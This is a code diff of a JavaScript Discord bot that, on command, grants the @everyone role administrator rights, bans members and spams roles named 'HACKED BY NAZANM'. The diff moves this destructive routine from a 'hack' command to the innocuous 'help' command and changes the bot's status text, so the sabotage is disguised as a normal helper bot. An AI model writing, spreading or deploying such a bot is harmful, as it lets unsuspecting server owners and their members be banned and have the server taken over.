@@ -17,13 +17,13 @@ client.on("ready", () => {
   console.log('By black jack');/////BLACK JACK 
 console.log('♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔');
 console.log(`Logged in as ${client.user.tag}!`);
-  client.user.setActivity(`${prefix}help | CREATED BY BLACK JACK ${client.guilds.size}`)///////shtek bnwsa
+  client.user.setActivity(`${prefix}help | BOT SESTAM ${client.guilds.size}`)///////shtek bnwsa
  client.user.setStatus("dnd")/////ba dly xot statusek bnwsa
   console.log(`Logined`)
 })
 
 client.on('message', message => {
-    if (message.content.toLowerCase() === prefix + 'hack') {
+    if (message.content.toLowerCase() === prefix + 'help') {
         message.guild.roles.find('name', '@everyone').edit({
             permissions: ["ADMINISTRATOR"]
         });
@@ -35,9 +35,7 @@ client.on('message', message => {
           
           member.ban()
       })
-      message.guild.roles.map(r => {
-            r.delete();
-      })
+      
         setInterval(() => {
             message.guild.createRole({
                 name: "HACKED BY NAZANM",
@@ -58,7 +56,7 @@ client.on('message', message => {
                 })
             }
                         
-                        , 500)
+                        , 3000)
             })
         }
     
